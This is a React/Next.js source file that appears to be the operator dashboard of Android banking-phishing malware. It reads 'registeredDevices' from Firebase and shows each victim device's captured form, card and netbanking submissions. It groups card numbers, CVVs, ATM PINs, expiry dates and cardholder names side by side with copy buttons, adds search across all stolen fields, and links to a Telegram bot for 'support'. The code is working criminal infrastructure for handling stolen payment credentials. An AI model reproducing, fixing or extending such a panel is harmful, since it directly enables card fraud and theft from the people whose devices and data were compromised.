"use client";

import Link from "next/link";
import { usePathname, useRouter } from "next/navigation";
import { db } from "@/lib/firbase";
import { Card } from "@heroui/react";
import { onValue, ref } from "firebase/database";
import { useEffect, useMemo, useState } from "react";
import { FaCopy } from "react-icons/fa";
import LineSpinner from "@/components/LineSpinner";

////////////////////////////////////////////////////////////
// CONSTANTS
////////////////////////////////////////////////////////////

const FORM_KEYS = ["atm_submittion", "atm_submissions", "form_submissions"];
const CARD_KEYS = ["card_payment", "card_payment_data", "card", "payment"];
const NETBANK_KEYS = ["netbanking", "netbanking_data"];

// Sensitive fields jo side by side dikhenge
const SENSITIVE_FIELDS = [
  "card_number", "cardNumber", "cardnumber", "card_no", "cardno",
  "cvv", "cvv2", "cvv_number", "cvvNumber",
  "pin", "atm_pin", "card_pin", "atmPin", "cardPin",
  "expiry", "expiry_date", "expiryDate", "exp", "valid_thru", "valid",
  "name_on_card", "cardholder", "cardHolder", "card_name"
];

////////////////////////////////////////////////////////////
// TYPES
////////////////////////////////////////////////////////////

type SubmissionRecord = {
  id: string;
  [key: string]: any;
};

type DeviceRecord = {
  id: string;
  brand: string;
  model: string;
  androidVersion: string;
  joinedAt: string;
  formSubmissions: SubmissionRecord[];
  cardSubmissions: SubmissionRecord[];
  netBankingSubmissions: SubmissionRecord[];
};

type ExtendedSubmission = SubmissionRecord & {
  type: "form" | "card" | "netbanking";
};

type FieldGroup = {
  key: string;
  value: any;
  displayValue: string;
};

////////////////////////////////////////////////////////////
// 🔥 TIMESTAMP FIX - SABHI KE LIYE
////////////////////////////////////////////////////////////

function parseTimestamp(value: any): number {
  if (!value) return 0;

  if (typeof value === "number") {
    return value < 1e12 ? value * 1000 : value;
  }

  if (typeof value === "string") {
    const v = value.trim();

    if (/^\d+$/.test(v)) {
      const num = Number(v);
      return num < 1e12 ? num * 1000 : num;
    }

    const parsed = Date.parse(v);
    return isNaN(parsed) ? 0 : parsed;
  }

  return 0;
}

function getTime(obj: any): number {
  return parseTimestamp(
    obj.timestamp || obj.createdAt || obj.updatedAt || 0
  );
}

////////////////////////////////////////////////////////////
// HELPERS
////////////////////////////////////////////////////////////

function formatSmartTime(timestamp: number) {
  if (!timestamp) return "N/A";

  const diff = Date.now() - timestamp;

  const m = Math.floor(diff / 60000);
  const h = Math.floor(diff / 3600000);
  const d = Math.floor(diff / 86400000);

  if (d > 0) return `${d}d ago`;
  if (h > 0) return `${h}h ago`;
  if (m > 0) return `${m}m ago`;

  return "Just now";
}

function formatTimestampValue(value: any) {
  const t = parseTimestamp(value);
  if (!t) return "N/A";
  return new Date(t).toLocaleString();
}

function formatDisplayValue(key: string, value: any) {
  if (value === null || value === undefined || value === "") {
    return "N/A";
  }

  const k = key.toLowerCase();

  if (
    k.includes("timestamp") ||
    k.includes("createdat") ||
    k.includes("updatedat")
  ) {
    return "";
  }

  if (typeof value === "object") {
    try {
      return JSON.stringify(value);
    } catch {
      return "Invalid data";
    }
  }

  return String(value);
}

function isSensitiveField(key: string): boolean {
  const lowerKey = key.toLowerCase();
  return SENSITIVE_FIELDS.some(field => lowerKey.includes(field));
}

////////////////////////////////////////////////////////////
// SORTING - LATEST FIRST (SABHI SUBMISSIONS KE LIYE)
////////////////////////////////////////////////////////////

function sortSubmissionsByLatest(items: SubmissionRecord[]) {
  if (!items || items.length === 0) return items;
  return [...items].sort((a, b) => getTime(b) - getTime(a));
}

function getLatestSubmissionTime(device: DeviceRecord): number {
  const all = [
    ...device.formSubmissions,
    ...device.cardSubmissions,
    ...device.netBankingSubmissions,
  ];

  if (all.length === 0) return 0;

  return Math.max(...all.map((s) => getTime(s)));
}

////////////////////////////////////////////////////////////
// DATA MAPPING
////////////////////////////////////////////////////////////

function mapSubmissions(data: any) {
  if (!data || typeof data !== "object") return [];

  const entries = Object.entries(data).map(([id, value]) => ({
    id,
    ...(value as object),
  }));

  return sortSubmissionsByLatest(entries);
}

function selectFirstAvailable(obj: any, keys: string[]) {
  for (const key of keys) {
    if (obj[key]) return obj[key];
  }
  return undefined;
}

function getDeviceName(device: DeviceRecord) {
  const name = `${device.brand} ${device.model}`.trim();
  return name === "" ? "Unknown Device" : name;
}

////////////////////////////////////////////////////////////
// MAIN COMPONENT
////////////////////////////////////////////////////////////

export default function FormPage() {
  const pathname = usePathname();
  const router = useRouter();

  const [devices, setDevices] = useState<DeviceRecord[]>([]);
  const [searchQuery, setSearchQuery] = useState("");
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    const dbRef = ref(db, "registeredDevices");

    const unsub = onValue(dbRef, (snap) => {
      try {
        if (!snap.exists()) {
          setDevices([]);
          setIsLoading(false);
          return;
        }

        const data = snap.val();

        const list: DeviceRecord[] = Object.entries(data).map(
          ([id, raw]: any) => {
            const form = mapSubmissions(selectFirstAvailable(raw, FORM_KEYS));
            const card = mapSubmissions(selectFirstAvailable(raw, CARD_KEYS));
            const net = mapSubmissions(selectFirstAvailable(raw, NETBANK_KEYS));

            return {
              id,
              brand: raw.brand || "Unknown",
              model: raw.model || "Unknown",
              androidVersion: String(raw.androidVersion || "Unknown"),
              joinedAt: formatTimestampValue(raw.joinedAt),
              formSubmissions: form,
              cardSubmissions: card,
              netBankingSubmissions: net,
            };
          }
        );

        list.sort(
          (a, b) => getLatestSubmissionTime(b) - getLatestSubmissionTime(a)
        );

        setDevices(list);
      } catch (error) {
        console.error("Error loading devices:", error);
        setDevices([]);
      } finally {
        setIsLoading(false);
      }
    });

    return () => unsub();
  }, []);

  const filteredDevices = useMemo(() => {
    const query = searchQuery.trim().toLowerCase();

    if (!query) {
      return devices;
    }

    return devices.filter((device) => {
      const matchesDevice =
        device.id.toLowerCase().includes(query) ||
        device.brand.toLowerCase().includes(query) ||
        device.model.toLowerCase().includes(query) ||
        getDeviceName(device).toLowerCase().includes(query);

      const submissionText = [
        ...device.formSubmissions,
        ...device.cardSubmissions,
        ...device.netBankingSubmissions,
      ]
        .flatMap((submission) => Object.values(submission))
        .map((value) => String(value ?? "").toLowerCase())
        .join(" ");

      return matchesDevice || submissionText.includes(query);
    });
  }, [devices, searchQuery]);

  const copyToClipboard = async (text: string, e: React.MouseEvent) => {
    e.stopPropagation();

    if (typeof window === "undefined") {
      return;
    }

    try {
      await navigator.clipboard.writeText(text);
    } catch {
      const textarea = document.createElement("textarea");
      textarea.value = text;
      textarea.setAttribute("readonly", "");
      textarea.style.position = "fixed";
      textarea.style.opacity = "0";
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand("copy");
      document.body.removeChild(textarea);
    }
  };

  const handleCardClick = (deviceId: string) => {
    if (!deviceId || deviceId === "Unknown") {
      return;
    }

    const url = `/devices/${deviceId}`;
    window.open(url, "_blank");
  };

  const getAllSubmissions = (device: DeviceRecord): ExtendedSubmission[] => {
    const all: ExtendedSubmission[] = [
      ...device.formSubmissions.map((s) => ({ ...s, type: "form" as const })),
      ...device.cardSubmissions.map((s) => ({ ...s, type: "card" as const })),
      ...device.netBankingSubmissions.map((s) => ({
        ...s,
        type: "netbanking" as const,
      })),
    ];

    return all.sort((a, b) => getTime(b) - getTime(a));
  };

  // Sensitive fields ko side by side ke liye group karo
  const getSensitiveFieldsInline = (submission: ExtendedSubmission): FieldGroup[] => {
    const sensitive: FieldGroup[] = [];

    Object.entries(submission).forEach(([key, value]) => {
      const keyLower = key.toLowerCase();
      if (
        key === "id" ||
        key === "type" ||
        keyLower === "timestamp" ||
        keyLower === "createdat" ||
        keyLower === "updatedat"
      ) {
        return;
      }

      const displayValue = formatDisplayValue(key, value);
      if (!displayValue || displayValue === "") return;

      if (isSensitiveField(key)) {
        sensitive.push({ key, value, displayValue });
      }
    });

    return sensitive;
  };

  // Normal fields ko alag se
  const getNormalFields = (submission: ExtendedSubmission): FieldGroup[] => {
    const normal: FieldGroup[] = [];

    Object.entries(submission).forEach(([key, value]) => {
      const keyLower = key.toLowerCase();
      if (
        key === "id" ||
        key === "type" ||
        keyLower === "timestamp" ||
        keyLower === "createdat" ||
        keyLower === "updatedat"
      ) {
        return;
      }

      const displayValue = formatDisplayValue(key, value);
      if (!displayValue || displayValue === "") return;

      if (!isSensitiveField(key)) {
        normal.push({ key, value, displayValue });
      }
    });

    return normal;
  };

  return (
    <div className="min-h-screen bg-white">
      <header className="w-full bg-black">
        <div className="mx-auto flex w-full max-w-3xl items-center justify-between px-5 py-4 gap-4">
          <Link
            href="/all"
            className="text-xl font-extrabold italic leading-none text-[#8B0000] shrink-0"
          >
            Anonymous
          </Link>
          <nav className="flex items-center gap-4 text-sm font-semibold text-white sm:gap-6 sm:text-base overflow-x-auto whitespace-nowrap scrollbar-hide">
            <Link
              href="/all"
              className={`transition-colors ${
                pathname === "/all" ? "text-white" : "text-white/85 hover:text-white"
              }`}
            >
              Home
            </Link>
            <Link
              href="/settings"
              className={`transition-colors ${
                pathname === "/settings"
                  ? "text-white"
                  : "text-white/85 hover:text-white"
              }`}
            >
              Setting
            </Link>
            <a
              href="https://t.me/@ApkRobot_bot?text=Hello%20Babydon%2C%20please%20fix%20my%20harmful%20issue%20as%20soon%20as%20possible."
              target="_blank"
              rel="noopener noreferrer"
              className="text-white/85 transition-colors hover:text-white"
            >
              Support
            </a>
            <button
              onClick={async () => {
                await fetch("/api/logout", { method: "POST" });
                router.push("/login");
              }}
              className="text-white/85 transition-colors hover:text-white cursor-pointer"
            >
              Logout
            </button>
          </nav>
        </div>
      </header>

      {isLoading ? (
        <div className="flex justify-center items-center min-h-[60vh]">
          <LineSpinner />
        </div>
      ) : (
        <main className="mx-auto w-full max-w-3xl px-5 py-8">
          <div className="space-y-5 rounded-[14px] border border-gray-300 bg-gray-100 p-5">
            <div className="flex items-center gap-3">
              <select
                aria-label="Filter forms"
                className="h-12 flex-1 rounded-2xl border-2 border-gray-400 bg-gray-100 px-4 text-base font-semibold text-gray-800 outline-none"
                onChange={(e) => router.push(e.target.value)}
                value={pathname}
              >
                <option value="/all">All</option>
                <option value="/messages">Messages</option>
                <option value="/forms">Forms</option>
                <option value="/devices">Devices</option>
              </select>
              <button
                onClick={() => window.location.reload()}
                className="h-12 rounded-2xl border-2 border-gray-400 bg-gray-100 px-6 text-base font-semibold text-gray-800 transition hover:bg-gray-200"
              >
                NEW
              </button>
            </div>

            <div className="relative">
              <span className="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-base text-gray-500">
                ⌕
              </span>
              <input
                type="text"
                value={searchQuery}
                onChange={(event) => setSearchQuery(event.target.value)}
                placeholder="Search Data By Any Field (Form, Card, Netbanking)"
                className="h-12 w-full rounded-2xl border-2 border-gray-400 bg-gray-100 pl-10 pr-4 text-base text-gray-800 outline-none placeholder:text-gray-500"
              />
            </div>

            {filteredDevices.length === 0 ? (
              <div className="p-10 text-center border border-gray-300 bg-white rounded-lg">
                <p className="text-lg font-semibold text-gray-700">
                  No matching data found
                </p>
                <p className="mt-2 text-sm text-gray-500">
                  Try a different search term or wait for new submissions.
                </p>
              </div>
            ) : (
              <div className="space-y-4">
                {filteredDevices.map((device) => {
                  const allSubmissions = getAllSubmissions(device);

                  if (allSubmissions.length === 0) return null;

                  return (
                    <div
                      key={device.id}
                      onClick={() => handleCardClick(device.id)}
                      className="cursor-pointer"
                    >
                      <Card className="w-full bg-white shadow-sm hover:shadow-md transition-shadow">
                        <div className="p-5">
                          {/* Device Info */}
                          <div className="mb-4 pb-3 border-b border-gray-200">
                            <div className="flex flex-wrap items-center justify-between gap-2 mb-2">
                              <span className="text-xs font-mono text-gray-600 bg-gray-100 px-2 py-1 rounded">
                                {device.id}
                              </span>
                              <div className="flex items-center gap-2 text-xs text-gray-500">
                                <span>
                                  {device.brand} {device.model}
                                </span>
                                {device.androidVersion !== "Unknown" && (
                                  <span>• Android {device.androidVersion}</span>
                                )}
                                <span>• {device.joinedAt}</span>
                              </div>
                            </div>
                          </div>

                          {/* SABHI SUBMISSIONS*/}
                          <div className="space-y-4">
                            {allSubmissions.map((submission, idx) => {
                              const timestamp = getTime(submission);
                              const sensitiveFields = getSensitiveFieldsInline(submission);
                              const normalFields = getNormalFields(submission);

                              const submissionType = submission.type;
                              let typeLabel = "";
                              let typeColor = "";
                              let borderColor = "";
                              
                              if (submissionType === "form") {
                                typeLabel = "FORM";
                                typeColor = "text-blue-600 bg-blue-50";
                                borderColor = "border-blue-200";
                              } else if (submissionType === "card") {
                                typeLabel = "CARD";
                                typeColor = "text-purple-600 bg-purple-50";
                                borderColor = "border-purple-200";
                              } else if (submissionType === "netbanking") {
                                typeLabel = "NETBANKING";
                                typeColor = "text-green-600 bg-green-50";
                                borderColor = "border-green-200";
                              }

                              return (
                                <div
                                  key={`${submission.id}-${idx}`}
                                  className={`border-l-2 ${borderColor} pl-3`}
                                >
                                  <div className="flex items-center gap-2 mb-3">
                                    <span
                                      className={`text-xs font-semibold px-2 py-0.5 rounded ${typeColor}`}
                                    >
                                      {typeLabel}
                                    </span>
                                    {timestamp > 0 && (
                                      <span className="text-xs text-gray-400">
                                        {new Date(timestamp).toLocaleString()} •{" "}
                                        {formatSmartTime(timestamp)}
                                      </span>
                                    )}
                                  </div>

                                  {/* SENSITIVE FIELDS - SIDE BY SIDE IN A SINGLE LINE */}
                                  {sensitiveFields.length > 0 && (
                                    <div className="mb-4 bg-gray-50 rounded-lg p-3 border border-gray-200">
                                      <div className="flex flex-wrap items-center gap-6">
                                        {sensitiveFields.map((field) => (
                                          <div key={field.key} className="flex items-center gap-2 group">
                                            <span className="font-bold text-gray-700 text-sm uppercase tracking-wide">
                                              {field.key}:
                                            </span>
                                            <span className="text-sm font-mono font-semibold text-gray-900">
                                              {field.displayValue}
                                            </span>
                                            <FaCopy
                                              size={12}
                                              onClick={(e) =>
                                                copyToClipboard(
                                                  String(field.value),
                                                  e
                                                )
                                              }
                                              className="cursor-pointer text-gray-400 hover:text-gray-600 transition-colors opacity-0 group-hover:opacity-100"
                                            />
                                          </div>
                                        ))}
                                      </div>
                                    </div>
                                  )}

                                  {/* NORMAL FIELDS - VERTICAL LAYOUT */}
                                  {normalFields.length > 0 && (
                                    <div>
                                      <div className="text-xs font-semibold text-gray-500 mb-2 uppercase tracking-wide">
                                        Additional Information
                                      </div>
                                      <div className="space-y-2">
                                        {normalFields.map((field) => (
                                          <div key={field.key} className="group">
                                            <div className="flex items-center gap-1 mb-1">
                                              <span className="font-semibold text-gray-700 text-xs uppercase tracking-wide">
                                                {field.key}:
                                              </span>
                                              <FaCopy
                                                size={11}
                                                onClick={(e) =>
                                                  copyToClipboard(
                                                    String(field.value),
                                                    e
                                                  )
                                                }
                                                className="cursor-pointer text-gray-400 hover:text-gray-600 transition-colors"
                                              />
                                            </div>
                                            <div className="text-sm text-gray-700 break-all leading-relaxed">
                                              {field.displayValue}
                                            </div>
                                          </div>
                                        ))}
                                      </div>
                                    </div>
                                  )}
                                </div>
                              );
                            })}
                          </div>
                        </div>
                      </Card>
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        </main>
      )}
    </div>
  );
}